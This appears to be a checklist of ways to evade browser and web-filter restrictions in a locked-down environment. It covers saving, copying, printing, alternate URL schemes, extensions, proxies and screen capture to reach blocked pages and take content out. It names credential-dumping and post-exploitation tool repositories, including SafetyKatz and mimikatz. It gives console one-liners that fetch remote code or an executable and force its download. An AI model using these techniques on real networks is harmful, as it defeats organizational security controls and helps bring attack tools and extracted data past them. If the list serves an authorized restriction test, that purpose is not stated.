File Save / Download Bypasses
                                                                                                                                                                           
  - Ctrl+S on restricted GitHub repos, Pastebin, etc. (you proved this)                                                                                                  
  - Ctrl+U (View Source) — can you see and copy raw HTML/code from blocked pages?                                                                                          
  - Ctrl+P → Save as PDF — print a restricted page to PDF, saves full content                                                                                              
  - Ctrl+P → Microsoft Print to PDF / CutePDF — same but via system printer                                                                                                
  - Right-click → Save Image As on images from restricted sites                                                                                                            
  - Right-click → Save Link As on download links the browser should block                                                                                                  
  - Drag a link from browser to Desktop/File Explorer — does it download?                                                                                                  
  - Drag selected text to Desktop — creates a .txt clipping file                                                                                                           
  - Drag an image from restricted page to Desktop — saves the image                                                                                                        
  - DevTools → Network tab → right-click response → Save as — saves any fetched resource                                                                                   
  - DevTools → Sources tab → right-click → Save as — saves loaded JS/HTML/CSS files                                                                                        
  - DevTools → Application → Cache Storage → preview and copy cached responses                                                                                             
  - data: URI in address bar — type data:text/html,<a href="https://restricted-file-url" download>click</a> and click it                                                   
  - Blob download from console — fetch('https://restricted-url').then(r=>r.blob()).then(b=>{var                                                                            
  a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='file.exe';a.click()})                                                                            
                                                                                                                                                                           
  Copy / Clipboard Bypasses                                                                                                                                                
                                                                                                                                                                         
  - Ctrl+A → Ctrl+C on a page with copy-protection — does it work?                                                                                                         
  - DevTools Console → document.body.innerText → copy from console output                                                                                                
  - DevTools Console → copy(document.body.innerHTML) — copies full HTML to clipboard                                                                                       
  - Ctrl+U (View Source) → Ctrl+A → Ctrl+C — source view may not have copy restrictions                                                                                  
  - Select text → Drag to another app (Notepad, Word) — drag-and-drop bypass                                                                                               
  - OCR/Screenshot → paste — Win+Shift+S snip and paste, bypasses text copy blocks                                                                                         
  - DevTools → Elements → select node → Copy → Copy outerHTML — extracts DOM content                                                                                       
                                                                                                                                                                           
  Navigation to Restricted Content                                                                                                                                         
                                                                                                                                                                           
  - Type URL directly in address bar vs clicking a link — are they filtered differently?                                                                                   
  - Bookmark a restricted URL then click the bookmark — bypasses referrer-based blocks?                                                                                  
  - Open restricted URL in Incognito/Private Window — different policy?                                                                                                    
  - Paste URL in address bar of a new tab — some filters only check clicked links                                                                                          
  - Browser history → click restricted URL — history navigation vs fresh request                                                                                           
  - javascript: in address bar — javascript:document.location='https://restricted.com'                                                                                     
  - Redirect via allowed site — Google cache:restricted-url, translate.google.com/translate?u=restricted-url                                                               
  - QR code scan — generate QR of restricted URL, scan with browser's camera feature                                                                                       
                                                                                                                                                                           
  Downloading Hacking Tools (like SafetyKatz)                                                                                                                              
                                                                                                                                                                           
  - GitHub Raw URL — raw.githubusercontent.com/GhostPack/SafetyKatz/master/SafetyKatz/Program.cs → Ctrl+S                                                                  
  - GitHub ZIP download — does the .zip download button work? https://github.com/GhostPack/SafetyKatz/archive/refs/heads/master.zip                                      
  - git clone from browser terminal (if one exists) or WebSSH                                                                                                              
  - GitHub API — https://api.github.com/repos/GhostPack/SafetyKatz/contents/ → browse via API, base64 decode files                                                         
  - GitHack / raw.githack.com — alternative CDN that mirrors GitHub                                                                                                        
  - Google Cache — webcache.googleusercontent.com/search?q=cache:github.com/GhostPack/SafetyKatz                                                                           
  - Wayback Machine — web.archive.org/web/https://github.com/GhostPack/SafetyKatz                                                                                          
  - DevTools Console — fetch('https://raw.githubusercontent.com/GhostPack/SafetyKatz/master/SafetyKatz/Program.cs').then(r=>r.text()).then(t=>{var b=new Blob([t]);var     
  a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='Program.cs';a.click()})                                                                          
                                                                                                                                                                         
  Other Offensive Tool Repos to Test                                                                                                                                       
                                                                                                                                                                         
  - github.com/gentilkiwi/mimikatz — credential dumping                                                                                                                    
  - github.com/PowerShellMafia/PowerSploit — PowerShell post-exploitation                                                                                                
  - github.com/carlospolop/PEASS-ng — privilege escalation                                                                                                                 
  - github.com/fortra/impacket — network protocol attacks                                                                                                                  
  - github.com/BloodHoundAD/BloodHound — AD enumeration                                                                                                                  
  - github.com/samratashok/nishang — PowerShell offensive framework                                                                                                        
  - github.com/byt3bl33d3r/CrackMapExec — network pen-testing                                                                                                              
  - github.com/Flangvik/SharpCollection — compiled .NET offensive tools                                                                                                    
                                                                                                                                                                           
  Print / Export Bypasses                                                                                                                                                  
                                                                                                                                                                           
  - Ctrl+P on restricted page — can you print it?                                                                                                                          
  - Print to PDF — saves full rendered page                                                                                                                              
  - Reader Mode (F9 in Firefox) on restricted content → Ctrl+P from reader mode                                                                                            
  - Send page via email (browser share feature) — attaches page content                                                                                                    
  - Web Clipper extensions (OneNote, Evernote) — do they work on restricted pages?                                                                                         
                                                                                                                                                                           
  Extension / Add-on Bypasses                                                                                                                                              
                                                                                                                                                                           
  - Can you install extensions at all? Try uBlock Origin, Tampermonkey                                                                                                     
  - Tampermonkey/Greasemonkey userscripts — inject JS on restricted pages                                                                                                
  - SingleFile extension — saves complete page as single HTML                                                                                                              
  - Full Page Screenshot extension — captures restricted content as image                                                                                                  
  - Modify Header extensions — change User-Agent, Referer to bypass blocks                                                                                                 
  - VPN/Proxy extensions — route traffic through unfiltered path                                                                                                           
                                                                                                                                                                           
  Protocol / Scheme Bypasses                                                                                                                                               
                                                                                                                                                                           
  - view-source:https://restricted-url — view source view might not be filtered                                                                                            
  - about:cache — browse browser cache for restricted content already loaded                                                                                             
  - about:memory / about:debugging — access internal browser tools                                                                                                         
  - FTP URL — ftp:// if a mirror exists                                                                                                                                    
  - blob: URL — create from fetched content, open in new tab                                                                                                               
                                                                                                                                                                           
  Screen Capture / Exfil                                                                                                                                                   
                                                                                                                                                                           
  - Win+Shift+S or PrtScn — screenshot restricted pages                                                                                                                    
  - Screen recording (OBS, Xbox Game Bar) — record restricted content                                                                                                    
  - DevTools → Run command → Capture full size screenshot — built-in full page screenshot                                                                                  
  - Browser screenshot flag — Firefox about:config → extensions.screenshots.disabled                                                                                       
                                                                                      
